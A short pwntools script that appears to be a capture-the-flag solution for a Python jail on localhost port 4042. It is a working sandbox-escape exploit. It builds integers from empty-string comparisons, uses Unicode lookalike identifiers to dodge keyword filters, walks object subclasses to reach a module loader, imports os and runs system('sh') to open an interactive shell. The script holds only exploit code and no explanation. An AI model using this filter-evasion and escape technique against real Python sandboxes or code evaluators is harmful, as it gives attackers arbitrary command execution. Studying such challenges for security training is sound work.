from pwn import *

HOST = 'localhost'
PORT = 4042

def craft_num(n):
    """
    (''=='') => True
    (''!='') => False
    """
    if n == 0:
        s = "(''!='')+(''!='')"
    elif n == 1:
        s = "(''=='')+(''!='')"
    elif n > 0:
        s = "(''=='')+" * n
        s = s[:-1]
    elif n < 0:
        s = "(''!='')+(''!='')"
        s += "-(''=='')" * abs(n)
    return s

def craft_os():
    return f"()._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘩𝘰𝘰𝘬_＿._＿𝘯𝘢𝘮𝘦_＿[{craft_num(11)}]+()._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘩𝘰𝘰𝘬_＿._＿𝘯𝘢𝘮𝘦_＿[{craft_num(2)}]"

def craft_sh():
    return f"()._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘩𝘰𝘰𝘬_＿._＿𝘯𝘢𝘮𝘦_＿[{craft_num(2)}]+()._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘩𝘰𝘰𝘬_＿._＿𝘯𝘢𝘮𝘦_＿[{craft_num(10)}]"

payload = f"()._＿𝘤𝘭𝘢𝘴𝘴_＿._＿𝘮𝘳𝘰_＿[{craft_num(1)}]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴_＿()[{craft_num(107)}].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦({craft_os()}).𝘴𝘺𝘴𝘵𝘦𝘮({craft_sh()})"

r = remote(HOST, PORT)

r.recvuntil(b'> ')
print(f"> {payload}")

r.sendline(payload.encode())
r.interactive()
